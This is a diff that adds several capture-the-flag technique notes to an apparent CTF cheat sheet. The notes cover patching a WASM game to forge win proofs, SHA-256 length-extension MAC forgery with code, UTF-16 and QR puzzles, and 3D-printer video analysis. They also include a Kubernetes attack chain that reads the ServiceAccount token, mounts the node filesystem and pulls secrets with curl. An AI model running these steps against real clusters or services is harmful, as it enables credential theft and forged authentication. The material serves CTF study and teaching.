@@ -335,6 +335,127 @@ def find_exploit(mult, balance_needed, inventory_needed):
 find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
 ```
 
+## WASM Game Exploitation via Patching (Pragyan 2026)
+
+**Pattern (Tac Tic Toe):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.
+
+**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.
+
+**Patching workflow:**
+```bash
+# 1. Convert WASM binary to text format
+wasm2wat main.wasm -o main.wat
+
+# 2. Find the minimax function (look for bestScore initialization)
+# Change initial bestScore from -1000 to 1000
+# Flip comparison: i64.lt_s → i64.gt_s (selects worst moves instead of best)
+
+# 3. Recompile
+wat2wasm main.wat -o main_patched.wasm
+```
+
+**Exploitation:**
+```javascript
+const go = new Go();
+const result = await WebAssembly.instantiate(
+  fs.readFileSync("main_patched.wasm"), go.importObject
+);
+go.run(result.instance);
+
+InitGame(proof_seed);
+// Play winning moves against weakened AI
+for (const m of [0, 3, 6]) {
+    PlayerMove(m);
+}
+const data = GetWinData();
+// Submit data.moves and data.proof to server → valid!
+```
+
+**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.
+
+## SHA-256 Length Extension Attack (LACTF 2026)
+
+**Pattern (ttyspin):** MAC = `SHA-256(SECRET || message)` with known message and hash. Forge valid MAC for `SECRET || message || padding || extension`.
+
+**Key insight:** SHA-256 (and MD5, SHA-1) are Merkle-Damgård constructions. Knowing `H(SECRET || msg)` lets you compute `H(SECRET || msg || glue_pad || ext)` without knowing SECRET.
+
+**Attack steps:**
+1. Compute glue padding: the padding SHA-256 would apply after `SECRET || msg`
+2. Construct new message: `msg || glue_pad || malicious_extension`
+3. Resume SHA-256 from the known hash state, feed extension bytes
+4. Result is valid MAC for the new message
+
+```bash
+# Using hashpumpy or hlextend:
+pip install hlextend
+```
+```python
+import hlextend
+sha = hlextend.new('sha256')
+new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
+new_hash = sha.hexdigest()
+# new_data includes original + glue padding + extension
+```
+
+**Common in CTFs:** Game save files, session tokens, API signatures using `H(secret || data)`. Always check if the MAC construction is vulnerable to length extension (SHA-256, MD5, SHA-1 are; HMAC, SHA-3 are NOT).
+
+## UTF-16 Endianness Reversal (LACTF 2026)
+
+**Pattern (endians):** Text "turned to Japanese" — mojibake from UTF-16 endianness mismatch.
+
+**Fix:** Reverse the encoding/decoding order:
+```python
+# If encoded as UTF-16-LE but decoded as UTF-16-BE:
+fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
+
+# If encoded as UTF-16-BE but decoded as UTF-16-LE:
+fixed = mojibake.encode('utf-16-le').decode('utf-16-be')
+```
+
+**Identification:** Text appears as CJK characters (Japanese/Chinese), challenge mentions "translation" or "endian".
+
+## QR Code Chunk Reassembly (LACTF 2026)
+
+**Pattern (error-correction):** QR code split into grid of chunks (e.g., 5x5 of 9x9 pixels), shuffled.
+
+**Solving approach:**
+1. **Fix known chunks:** Use structural patterns — finder patterns (3 corners), timing patterns, alignment patterns — to place ~50% of chunks
+2. **Extract codeword constraints:** For each candidate payload length, use QR spec to identify which pixels are invariant across encodings
+3. **Backtracking search:** Assign remaining chunks under pixel constraints until QR decodes successfully
+
+**Tools:** `segno` (Python QR library), `zbarimg` for decoding.
+
+## Kubernetes RBAC Bypass (LACTF 2026)
+
+**Pattern (CTFaaS):** Container deployer with claimed ServiceAccount isolation.
+
+**Attack chain:**
+1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
+2. Verify token can impersonate deployer SA (common misconfiguration)
+3. Create pod with `hostPath` volume mounting `/` → read node filesystem
+4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
+5. Use node credentials to access hidden namespaces and read secrets
+
+```bash
+# From inside pod:
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
+```
+
+## 3D Printer Video Nozzle Tracking (LACTF 2026)
+
+**Pattern (flag-irl):** Video of 3D printer fabricating nameplate. Flag is the printed text.
+
+**Technique:** Track nozzle X/Y positions from video frames, filter for print moves (top/text layer only), plot 2D histogram to reveal letter shapes:
+```python
+# 1. Identify text layer frames (e.g., frames 26100-28350)
+# 2. Track print head X position (physical X-axis)
+# 3. Track bed X position (physical Y-axis from camera angle)
+# 4. Filter for moves with extrusion (head moving while printing)
+# 5. Plot as 2D scatter/histogram → letters appear
+```
+
 ## Useful One-Liners
 
 ```bash
